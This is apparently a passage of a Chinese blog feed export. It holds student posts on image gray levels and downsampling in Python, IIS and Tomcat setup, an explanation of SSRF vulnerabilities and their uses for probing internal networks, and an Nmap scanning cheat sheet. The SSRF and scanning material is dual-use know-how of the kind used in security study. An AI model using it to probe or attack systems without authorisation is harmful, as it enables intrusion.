class="headerlink" title="问题解决思路："></a>问题解决思路：</h3><p>这个问题涉及到计算灰度级数量、计算灰度级差异以及判断在不同位数下是否难以视觉区分不同灰度级。解决思路如下：</p><ol><li>首先，根据给定的位数，计算灰度级数量。灰度级数量等于2的位数次方。</li><li>然后，根据不同的位数，计算灰度级数量之间的差异。灰度级差异等于两个位数下的灰度级数量之差。</li><li>最后，判断不同位数下是否难以视觉区分不同灰度级。若灰度级数量大于2，则认为难以区分，反之则容易区分。</li></ol><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_gray_values</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算灰度级数量&quot;&quot;&quot;</span></span><br><span class="line">    gray_values = <span class="number">2</span> ** bits  <span class="comment"># 灰度级数量等于2的bits次方</span></span><br><span class="line">    <span class="keyword">return</span> gray_values</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_difference</span>(<span class="params">bits1, bits2</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算灰度级差异&quot;&quot;&quot;</span></span><br><span class="line">    gray_values1 = calculate_gray_values(bits1)</span><br><span class="line">    gray_values2 = calculate_gray_values(bits2)</span><br><span class="line"></span><br><span class="line">    difference = gray_values2 - gray_values1  <span class="comment"># 灰度级差异等于两个位数下的灰度级数量之差</span></span><br><span class="line">    <span class="keyword">return</span> difference</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">distinguish_boundaries</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;判断在不同位数下是否难以视觉区分不同灰度级&quot;&quot;&quot;</span></span><br><span class="line">    gray_values = calculate_gray_values(bits)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> gray_values &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;对于我们来说，视觉上区分不同级别之间的边界变得更加困难。&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;我们仍然能够轻松地在不同级别之间视觉上区分边界。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试代码</span></span><br><span class="line">bits1 = <span class="number">4</span></span><br><span class="line">bits2 = bits1 + <span class="number">1</span></span><br><span class="line">gray_values1 = calculate_gray_values(bits1)</span><br><span class="line">gray_values2 = calculate_gray_values(bits2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;如果比特数增加一位，灰度值数量将翻倍: <span class="subst">&#123;gray_values2 == gray_values1 * <span class="number">2</span>&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot; <span class="subst">&#123;bits1&#125;</span> 位 和 <span class="subst">&#123;bits2&#125;</span> 位 之间的灰度值差异为: <span class="subst">&#123;calculate_difference(bits1, bits2)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断不同位数下是否难以视觉区分不同灰度级</span></span><br><span class="line">distinguish_boundaries(bits1)</span><br><span class="line">distinguish_boundaries(bits2)</span><br></pre></td></tr></table></figure><p>四、这段代码的思路步骤可以总结如下：</p><ol><li><p>定义一个函数<code>calculate_gray_values(bits)</code>，计算灰度级数量。根据输入的位数（bits），通过2的bits次方计算出灰度级数量，并返回结果。</p></li><li><p>定义一个函数<code>calculate_difference(bits1, bits2)</code>，计算灰度级差异。调用<code>calculate_gray_values</code>函数分别计算出bits1和bits2下的灰度级数量，然后用灰度级数量2减去bits1下的灰度级数量，得到灰度级差异，并返回结果。</p></li><li><p>定义一个函数<code>distinguish_boundaries(bits)</code>，判断在不同位数下是否难以视觉区分不同灰度级。调用<code>calculate_gray_values</code>函数计算出给定位数下的灰度级数量，然后根据灰度级数量是否大于2判断结果，并输出对应的提示信息。</p></li><li><p>测试代码部分，分别定义bits1和bits2的值。然后调用<code>calculate_gray_values</code>计算出bits1和bits2下的灰度级数量。</p></li><li><p>输出结果，打印比特数增加一位后灰度值数量翻倍的结果，并打印bits1位和bits2位之间的灰度值差异。</p></li><li><p>调用<code>distinguish_boundaries</code>函数，判断不同位数下是否难以视觉区分不同灰度级，并输出结果。先传入bits1进行判断，再传入bits2进行判断。</p></li></ol><h3 id="题目2代码运行结果"><a href="#题目2代码运行结果" class="headerlink" title="题目2代码运行结果"></a>题目2代码运行结果</h3><p><img src="https://s2.loli.net/2023/09/17/2HD6y5zrAmp4sCF.png" alt="image-20230917153220835"></p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>这段代码实现了灰度级数量的计算、灰度级差异的计算以及不同位数下是否难以视觉区分的判断。<br>运行代码后，会输出计算结果和判断结果。根据示例运行结果，我们可以得出结论：增加一位的位数，灰度级数量会翻倍；<br>不同位数下的灰度级差异为16；当位数增加时，难以视觉区分不同灰度级。</p><h2 id="问题3："><a href="#问题3：" class="headerlink" title="问题3："></a>问题3：</h2><p><img src="https://s2.loli.net/2023/09/17/M7pIGzsbgCiY6Zv.png" alt="image-20230917153313037"></p><h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开原始图像</span></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&quot;xxx.jpg&quot;</span>)</span><br><span class="line"><span class="comment"># 将图像转换为灰度图像</span></span><br><span class="line">gray_image = image.convert(<span class="string">&quot;L&quot;</span>)</span><br><span class="line"><span class="comment"># 进行4倍减采样</span></span><br><span class="line">image_4x = gray_image.resize((image.width // <span class="number">4</span>, image.height // <span class="number">4</span>))</span><br><span class="line"><span class="comment"># 进行16倍减采样</span></span><br><span class="line">image_16x = gray_image.resize((image.width // <span class="number">16</span>, image.height // <span class="number">16</span>))</span><br><span class="line"><span class="comment"># 将图像转换为NumPy数组</span></span><br><span class="line">np_image1 = np.array(image_4x)</span><br><span class="line">np_image2 = np.array(image_16x)</span><br><span class="line"><span class="comment"># 创建一个包含两个子图的画布</span></span><br><span class="line">fig, (ax1, ax2) = plt.subplots(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># 在第一个子图中显示第一个图像</span></span><br><span class="line">ax1.imshow(np_image1, cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">ax1.set_title(<span class="string">&#x27;Image 1 4x downsampling&#x27;</span>)</span><br><span class="line"><span class="comment"># 在第二个子图中显示第二个图像</span></span><br><span class="line">ax2.imshow(np_image2, cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">ax2.set_title(<span class="string">&#x27;Image 16x downsampling&#x27;</span>)</span><br><span class="line"><span class="comment"># 隐藏坐标轴</span></span><br><span class="line">ax1.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">ax2.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line"><span class="comment"># 调整子图之间的间距</span></span><br><span class="line">plt.subplots_adjust(wspace=<span class="number">0.2</span>)</span><br><span class="line"><span class="comment"># 显示图像</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3 id="问题3运行结果："><a href="#问题3运行结果：" class="headerlink" title="问题3运行结果："></a>问题3运行结果：</h3><p><img src="https://s2.loli.net/2023/09/13/lvWZOwYXPR7bfu2.png" alt="image-20230913203746799"></p><h2 id="问题4："><a href="#问题4：" class="headerlink" title="问题4："></a>问题4：</h2><p><img src="https://s2.loli.net/2023/09/17/2wWOSzyrUupZh5x.png" alt="image-20230917153335058"></p><h3 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_to_grayscale</span>(<span class="params">image, levels</span>):</span><br><span class="line">    <span class="comment"># 转换为灰度图像</span></span><br><span class="line">    grayscale_image = image.convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 调整灰度级别</span></span><br><span class="line">    grayscale_images = []</span><br><span class="line">    <span class="keyword">for</span> level <span class="keyword">in</span> levels:</span><br><span class="line">        factor = <span class="number">256</span> // level</span><br><span class="line">        converted_image = grayscale_image.point(<span class="keyword">lambda</span> x: x // factor * factor)</span><br><span class="line">        grayscale_images.append(converted_image)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> grayscale_images</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display_images</span>(<span class="params">images</span>):</span><br><span class="line">    <span class="comment"># 创建一个新的图片，用于显示多个灰度图像</span></span><br><span class="line">    width, height = images[<span class="number">0</span>].size</span><br><span class="line">    result_image = Image.new(<span class="string">&#x27;L&#x27;</span>, (width * <span class="number">3</span>, height * <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将灰度图像按顺序拼接到一张图片上</span></span><br><span class="line">    <span class="keyword">for</span> i, image <span class="keyword">in</span> <span class="built_in">enumerate</span>(images[:<span class="number">3</span>]):</span><br><span class="line">        result_image.paste(image, (i * width, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, image <span class="keyword">in</span> <span class="built_in">enumerate</span>(images[<span class="number">3</span>:]):</span><br><span class="line">        result_image.paste(image, (i * width, height))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 显示图片</span></span><br><span class="line">    result_image.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开原始图片</span></span><br><span class="line">original_image = Image.<span class="built_in">open</span>(<span class="string">&#x27;xxx.jpg&#x27;</span>)</span><br><span class="line"><span class="comment"># 定义要转换的灰度级别</span></span><br><span class="line">levels = [<span class="number">256</span>, <span class="number">64</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>]</span><br><span class="line"><span class="comment"># 将图片转换为不同的灰度级图像</span></span><br><span class="line">grayscale_images = convert_to_grayscale(original_image, levels)</span><br><span class="line"><span class="comment"># 在一张图片内显示灰度级图像</span></span><br><span class="line">display_images(grayscale_images)</span><br></pre></td></tr></table></figure><h3 id="问题4运行结果："><a href="#问题4运行结果：" class="headerlink" title="问题4运行结果："></a>问题4运行结果：</h3><p><img src="https://s2.loli.net/2023/09/13/VcrhO1AEKgjDpJs.png" alt="image-20230913205253264"></p>]]></content>
      
      
      <categories>
          
          <category> 作业 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞</title>
      <link href="/posts/cac2.html"/>
      <url>/posts/cac2.html</url>
      
        <content type="html"><![CDATA[<h1 id="KNOW-IT-什么是SSRF？"><a href="#KNOW-IT-什么是SSRF？" class="headerlink" title="KNOW IT, 什么是SSRF？"></a>KNOW IT, 什么是SSRF？</h1><p><strong>定义：</strong></p><p>SSRF漏洞，中文全称为服务端请求伪造漏洞，是一种由攻击者构造一定的利用代码导致服务端发起漏洞利用请求的安全漏洞。一般情况下，SSRF攻击的应用是无法通过外网访问的，所以需要借助目标服务端进行发起，目标服务器可以链接内网和外网，攻击者便可以通过目标主机攻击内网应用。</p><p>简而言之就是：<br>利用一个可以发起网络请求的服务，当作跳板来攻击其他服务。</p><p>常见例子：<br>通过Web Interface请求受保护网络内的资源。<br><img src="https://pic3.zhimg.com/80/v2-255233f06f32600141cb27a411fa1da2_1440w.jpg" alt="img">SSRF漏洞原理图</p><p>由于业务需要，服务端程序需要从其他服务器应用中获取数据，例如获取图片、数据等，但是由于服务器没有对其请求的目标地址做过滤和限制，导致黑客可以利用此缺陷请求任意服务器资源，其中就包含隐匿在内网的应用。很多企业认为服务器在内网不会受到黑客攻击，便放任漏洞不管，不做补丁修复和版本升级，弱口令遍布内网。但是在SSRF漏洞面前这些漏洞都会成为黑客的“盘中餐”。 SSRF漏洞一般为HTTP／HTTPS方式出现，但类似TCP Connect方式也可以探测内网的IP活跃状态和端口的开放情况，但此类危害较小。</p><p><strong>SSRF漏洞出现的位置</strong>：</p><ul><li>服务器主动发起网络请求，例如HTTP／HTTPS／Socket</li><li>分享功能，通过URL分享网页内容。</li><li>图片加载、下载功能</li><li>邮件系统</li><li>api远程调用</li><li>只要是服务器可以主动发起网络请求便可能出现</li></ul><p><strong>SSRF漏洞的危害</strong>：</p><ol><li>对目标服务器所在的内网进行IP存活性扫描和端口扫描</li><li>利用扫描的指纹信息判断开放的服务，从而对内网的主机进行攻击</li><li>识别内网WEB应用指纹，判断应用类型进行攻击</li><li>使用特定协议攻击应用（gopher、dict、file、FTP／SFTP等）</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Install-IIS-Tomcat</title>
      <link href="/posts/af46.html"/>
      <url>/posts/af46.html</url>
      
        <content type="html"><![CDATA[<h1 id="web服务器的配置"><a href="#web服务器的配置" class="headerlink" title="web服务器的配置"></a>web服务器的配置</h1><h1 id="Windows服务器安装IIS"><a href="#Windows服务器安装IIS" class="headerlink" title="Windows服务器安装IIS"></a>Windows服务器安装IIS</h1><p><a href="https://www.imsdn.cn/windows-server/windows-server-2008/">Windows Server 2008 ISO镜像下载 - 我的MSDN (imsdn.cn)</a>下载对应ISO镜像。</p><h2 id="Windows-Server-2008镜像安装"><a href="#Windows-Server-2008镜像安装" class="headerlink" title="Windows Server 2008镜像安装"></a>Windows Server 2008镜像安装</h2><p>图省事直接使用推荐安装即可。</p><p><img src="https://s2.loli.net/2023/09/17/5WKXBnra6y8zeFp.png" alt="image-20230917175249312"></p><p>加载对应镜像。</p><p><img src="https://s2.loli.net/2023/09/17/IyoJuNWpk3nvTU1.png" alt="image-20230917175352397"></p><p>后面的配置无脑下一步就行。</p><h2 id="安装IIS"><a href="#安装IIS" class="headerlink" title="安装IIS"></a>安装IIS</h2><p>打开“服务器管理器”页面中的“角色”，“添加角色”。</p><p><img src="https://s2.loli.net/2023/09/17/hSAUpW7cFd3xD4e.png" alt="image-20230917181616245"></p><p>在服务器角色选择页面中选择web服务器(IIS)</p><p><img src="https://s2.loli.net/2023/09/17/Vm1FZMRPtrGNSYg.png" alt="image-20230917181707363"></p><p>一直下一步安装。</p><p><img src="https://s2.loli.net/2023/09/17/8vr4aQZHn7IRSUq.png" alt="image-20230917181912446"></p><p>安装成功</p><h2 id="IIS新建web网页"><a href="#IIS新建web网页" class="headerlink" title="IIS新建web网页"></a>IIS新建web网页</h2><p>点击IIS管理器新建网站</p><p><img src="https://s2.loli.net/2023/09/17/H9tcmFYZ7kKAhJa.png" alt="image-20230917182005322"></p><p>填写网站名称等信息。</p><p><img src="https://s2.loli.net/2023/09/17/MwjRSE98DU3G52r.png" alt="image-20230917182111963"></p><p>注意，别用80端口，会被占用。</p><p><img src="https://s2.loli.net/2023/09/17/i5Pzoeu8NsOfUCE.png" alt="image-20230917182303473"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Page Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;This is a Heading&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;This is a paragraph.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在c://web目录下新建index.html加入以下内容访问即可。</p><h1 id="Linux服务器安装Tomcat"><a href="#Linux服务器安装Tomcat" class="headerlink" title="Linux服务器安装Tomcat"></a>Linux服务器安装Tomcat</h1><h2 id="安装前置条件"><a href="#安装前置条件" class="headerlink" title="安装前置条件"></a>安装前置条件</h2><p>Tomcat的安装分为两个步骤：安装JDK和安装Tomcat.</p><p>安装Tomcat需要先安装JDK，本机已经安装过JDK17，故不再安装。</p><p><img src="https://s2.loli.net/2023/09/17/S48YGBxr6A3yjXR.png" alt="image-20230917154732101"></p><p>服务器为centos7.9.2009，环境为Java17。</p><h2 id="下载Linux版Tomcat"><a href="#下载Linux版Tomcat" class="headerlink" title="下载Linux版Tomcat"></a>下载Linux版Tomcat</h2><p>tar.gz：Linux环境下的压缩包，免安装！</p><p>1、下载Linux版Tomcat安装包有两种方法，第一种手动在Tomcat官网下载，并使用FTP将文件上传至Linux指定目录下安装。</p><p><img src="https://s2.loli.net/2023/09/17/nv9sLZXRxJ4GyPM.png" alt="image-20230917162624102"></p><p>2、也可以直接在服务器上使用wget命令下载。（这里用清华的镜像）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-10/v10.1.13/bin/apache-tomcat-10.1.13.tar.gz</span><br></pre></td></tr></table></figure><h2 id="安装Tomcat10"><a href="#安装Tomcat10" class="headerlink" title="安装Tomcat10"></a>安装Tomcat10</h2><p>在/usr/local目录下新建目录Apache。（用于存放Tomcat的安装位置）。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /usr/local/Apache</span><br></pre></td></tr></table></figure><p>进入下载好的Tomcat压缩包地址路径，解压Tomcat至/usr/local/Apache目录中。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf apache-tomcat-10.1.13.tar.gz  -C  /usr/local/Apache</span><br></pre></td></tr></table></figure><p>进入解压目录检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/Apache</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>文件在/usr/local/Apache/apache-tomcat-10.1.13下就代表安装成功了。 </p><h2 id="启动Tomcat程序"><a href="#启动Tomcat程序" class="headerlink" title="启动Tomcat程序"></a>启动Tomcat程序</h2><p>进入Tomcat安装目录。启动Tomcat。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./startup.sh</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/09/17/uPvZq4D8JeV5bij.png" alt="image-20230917164022079"></p><p>服务器防火墙开放8080端口（默认不开放的），访问服务器的8080端口即可。</p><p><img src="C:/Users/Hong/AppData/Roaming/Typora/typora-user-images/image-20230917164340482.png" alt="image-20230917164340482"></p><p>出现小猫咪就代表安装成功了。</p><p>可以使用<code>ps aux |grep tomcat</code>查看tomcat运行状态</p><p><img src="C:/Users/Hong/AppData/Roaming/Typora/typora-user-images/image-20230917164224411.png" alt="image-20230917164224411"></p><h2 id="Tomcat配置服务和自启动"><a href="#Tomcat配置服务和自启动" class="headerlink" title="Tomcat配置服务和自启动"></a>Tomcat配置服务和自启动</h2><p>1、Tomcat配置服务</p><p>新建服务脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/init.d/tomcat</span><br></pre></td></tr></table></figure><p>添加脚本内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># description: Tomcat10 Start Stop Restart</span></span><br><span class="line"><span class="comment"># processname: tomcat10</span></span><br><span class="line"></span><br><span class="line">CATALINA_HOME=/usr/local/Apache/apache-tomcat-10.1.13</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">        start)</span><br><span class="line">                sh <span class="variable">$CATALINA_HOME</span>/bin/startup.sh</span><br><span class="line">                ;;</span><br><span class="line">        stop)</span><br><span class="line">                sh <span class="variable">$CATALINA_HOME</span>/bin/shutdown.sh</span><br><span class="line">                ;;</span><br><span class="line">        restart)</span><br><span class="line">                sh <span class="variable">$CATALINA_HOME</span>/bin/shutdown.sh</span><br><span class="line">                sh <span class="variable">$CATALINA_HOME</span>/bin/startup.sh</span><br><span class="line">                ;;</span><br><span class="line">        *)</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&#x27;please use : tomcat &#123;start | stop | restart&#125;&#x27;</span></span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure><p><code>chmod +x tomcat</code>给脚本添加执行权限，执行脚本，启动、停止 和 重启服务。</p><p>由于高版本JDK17缺失jre会出现报错：</p><p><img src="https://s2.loli.net/2023/09/17/AYTCp2l1V7uwmSZ.png" alt="image-20230917170913331"></p><p>生成对应jre</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jlink --module-path jmods --add-modules java.desktop --output jre</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/09/17/Be1S4bypQltKEhw.png" alt="image-20230917171111331"></p><p>添加jre环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line">添加</span><br><span class="line">export JRE_HOME=$JAVA_HOME/jre</span><br></pre></td></tr></table></figure><p>启动：service tomcat start</p><p>停止：service tomcat stop</p><p>重启：service tomcat restart</p><p><img src="https://s2.loli.net/2023/09/17/HVPv921lZICDhEF.png" alt="image-20230917171323861"></p><p>2、Tomcat配置开机自启动</p><p>向chkconfig添加 tomcat 服务的管理</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --add tomcat</span><br></pre></td></tr></table></figure><p>设置tomcat服务自启动</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig tomcat on</span><br></pre></td></tr></table></figure><p>查看tomcat的启动状态</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list | grep tomcat</span><br></pre></td></tr></table></figure><p>关闭tomcat服务自启动：chkconfig tomcat off</p><p>删除tomcat服务在chkconfig上的管理：chkconfig —del tomcat</p><h2 id="Tomcat新建web网页"><a href="#Tomcat新建web网页" class="headerlink" title="Tomcat新建web网页"></a>Tomcat新建web网页</h2><p>在webapps路径下添加text文件夹，在期内添加index.jsp。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; %&gt; &lt;%@ page import=&quot;java.util.*&quot; %&gt; &lt;% out.println(&quot;Hello,world Tomcat&quot;); %&gt; </span><br></pre></td></tr></table></figure><p>重启tomcat访问/text。</p><p><img src="https://s2.loli.net/2023/09/17/TxUgkJ6h43CjoGK.png" alt="image-20230917221545267"></p>]]></content>
      
      
      <categories>
          
          <category> 作业 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap 指北</title>
      <link href="/posts/ed6b.html"/>
      <url>/posts/ed6b.html</url>
      
        <content type="html"><![CDATA[<h1 id="nmap端口扫描"><a href="#nmap端口扫描" class="headerlink" title="nmap端口扫描 #"></a>nmap端口扫描 <a href="https://wiki.wgpsec.org/knowledge/tools/nmap.html#nmap端口扫描">#</a></h1><p><a href="https://nmap.org/man/zh/">nmap官方文档(opens new window)</a></p><h1 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -v -Pn IP</span><br><span class="line"><span class="comment">#最常用的一种扫描</span></span><br><span class="line"></span><br><span class="line">-T4<span class="comment">#设置时序，越高扫描越快</span></span><br><span class="line">-A<span class="comment">#启用操作系统检测，版本检测，脚本扫描和跟踪路由</span></span><br><span class="line">-v<span class="comment">#增加详细级别（使用-vv或更高级别以获得更好的效果）</span></span><br><span class="line">-Pn<span class="comment">#无ping扫描</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 红队工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Goby安装与使用</title>
      <link href="/posts/70e8.html"/>
      <url>/posts/70e8.html</url>
      
